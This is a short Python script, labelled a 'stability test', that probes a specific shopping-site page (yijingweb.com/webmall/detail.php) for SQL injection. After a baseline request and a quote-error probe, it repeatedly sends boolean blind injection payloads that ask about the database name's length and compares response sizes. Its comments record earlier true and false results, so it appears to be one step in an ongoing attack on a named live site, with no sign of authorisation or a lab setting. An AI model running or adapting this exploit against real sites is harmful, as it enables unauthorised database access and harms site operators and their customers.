#!/usr/bin/env python3
"""stability test - repeat same condition 5x, measure size variance"""
import urllib.request, time

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://yijingweb.com/webmall/detail.php"

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000))
    except Exception as ex:
        return 0, 0

print("=== baseline id=686 ===")
for i in range(3):
    code, sz = fetch(BASE + "?id=686")
    print("  base %d: code=%s size=%d" % (i, code, sz))

print("=== quote error ===")
for i in range(3):
    code, sz = fetch(BASE + "?id=686%27")
    print("  quote %d: code=%s size=%d" % (i, code, sz))

print("=== db-len=2 (was true 22793) ===")
p = "%27%20OR%20(select%20length(database()))=2--%20"
for i in range(5):
    code, sz = fetch(BASE + "?id=686" + p)
    print("  len2 %d: code=%s size=%d" % (i, code, sz))
    time.sleep(0.5)

print("=== db-len=7 (was false 4374) ===")
p2 = "%27%20OR%20(select%20length(database()))=7--%20"
for i in range(5):
    code, sz = fetch(BASE + "?id=686" + p2)
    print("  len7 %d: code=%s size=%d" % (i, code, sz))
    time.sleep(0.5)
